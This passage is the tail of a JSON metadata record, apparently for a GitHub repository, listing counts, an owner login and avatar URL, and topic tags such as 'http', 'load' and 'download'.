    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 29098174,
    "owner_login": "romanshutsman",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/29098174?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "client",
      "http",
      "https",
      "load",
      "download"
    ]
  }
]